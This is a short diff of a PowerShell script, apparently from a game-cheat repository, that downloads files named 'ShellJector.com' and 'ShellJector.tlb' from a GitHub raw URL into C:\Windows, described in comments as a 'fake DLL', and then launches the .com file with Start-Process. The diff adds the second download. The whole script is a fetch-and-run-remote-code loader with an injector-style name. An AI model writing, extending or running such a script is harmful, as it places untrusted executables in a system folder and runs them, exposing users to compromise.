@@ -23,5 +23,8 @@ gpupdate /force
 # Download fake DLL and place it in the plugins folder
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.com" -OutFile "C:\Windows\ShellJector.com"
 
+# Download fake DLL and place it in the plugins folder
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb" -OutFile "C:\Windows\ShellJector.tlb"
+
 # Run the File
 Start-Process -FilePath "C:\Windows\ShellJector.com"
